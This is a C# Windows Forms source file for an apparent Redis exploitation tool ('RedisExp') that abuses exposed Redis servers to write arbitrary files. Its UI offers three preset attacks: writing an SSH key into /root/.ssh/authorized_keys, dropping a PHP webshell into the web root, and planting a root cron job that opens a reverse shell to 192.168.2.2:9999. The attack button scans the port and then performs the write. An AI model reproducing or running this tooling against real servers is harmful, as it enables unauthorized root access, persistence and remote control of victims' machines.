using System.Net.Sockets;
using System.Windows.Forms;

namespace RedisExp
{
    public partial class RedisExpUI : Form
    {
        public RedisExpUI()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void contentBox_TextChanged(object sender, EventArgs e) {
            this.contentBox.LanguageOption = RichTextBoxLanguageOptions.UIFonts;
        }


        private void expBox_TextChanged(object sender, EventArgs e)
        {
            /*
            ssh公钥
            webshell
            反弹shell
             */
            if (expBox.SelectedIndex == 0)
            {
                pathBox.Text = "/root/.ssh/authorized_keys";
                expBox.SelectedIndex = 0;
            }
            else if (expBox.SelectedIndex == 1)
            {
                pathBox.Text = "/var/www/html/redisat.php";
                contentBox.Text = "<?php phpinfo(); ?>";
            }
            else if (expBox.SelectedIndex == 2)
            {
                pathBox.Text = "/var/spool/cron/root";
                contentBox.Text = "* * * * * bash -i >& /dev/tcp/192.168.2.2/9999 0>&1";
            }
        }

        private void attackBtn_Click(object sender, EventArgs e)
        {
            string host = addressBox.Text; // The host to scan
            int port = int.Parse(portBox.Text); // The port to check
            string password = passBox.Text;

            bool isOpen = PortScanner.IsPortOpen(host, port, 2);
            if (!isOpen)
            {
                logTextBoxAdd("端口未打开，请稍后再试");
                return;
            }
            else
            {
                logTextBoxAdd("端口已打开，开始测试");
            }
            String payloadcontent = contentBox.Text;
            RedisEx rdsexp = new RedisEx(host, port, password);
            rdsexp.setPayload(payloadcontent);
            rdsexp.setFilename(pathBox.Text);
            var chk = rdsexp.Check();
            logTextBoxAdd(chk.Item2);
            if (!chk.Item1)
            {
                return;
            }
            if (rdsexp.Attack() == "OK")
            {
                logTextBoxAdd("写入成功");
            }
            else
            {
                logTextBoxAdd(rdsexp.Attack());
            }
        }

        private void logTextBoxAdd(String log)
        {
            logTextBox.Text = logTextBox.Text +"\n"+ log;
            logTextBox.SelectionStart = logTextBox.Text.Length;
            logTextBox.ScrollToCaret();
        }
    }
}
